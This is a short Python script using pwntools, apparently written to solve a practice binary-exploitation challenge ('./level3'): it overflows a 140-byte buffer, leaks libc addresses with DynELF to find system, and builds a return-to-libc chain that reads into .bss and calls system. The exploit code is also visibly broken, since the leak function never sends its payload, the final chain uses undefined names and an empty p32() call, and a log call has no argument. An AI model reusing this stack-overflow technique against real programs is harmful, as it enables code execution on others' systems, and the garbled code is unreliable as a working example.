from pwn import *
context.log_level='debug'
p=process('./level3')
elf=ELF('./level3')
read_addr=elf.plt['read']
write_addr=elf.plt['write']
pop_ret=0x080482f1
main_addr=0x08048350
def leak(addr):
	payload='a'*140
	p.sendline()
	data=p.recv(4)
	return data
d=DynELF(leak,elf)
sys_addr=d.lookup('__libc_system','libc')
log.success()
bss_addr=elf.bss()
payload='a'*140+p32(read)+p32(sys)+p32(0)+p32(bss_addr)+p32(8)+p32()+p32(bss_addr)
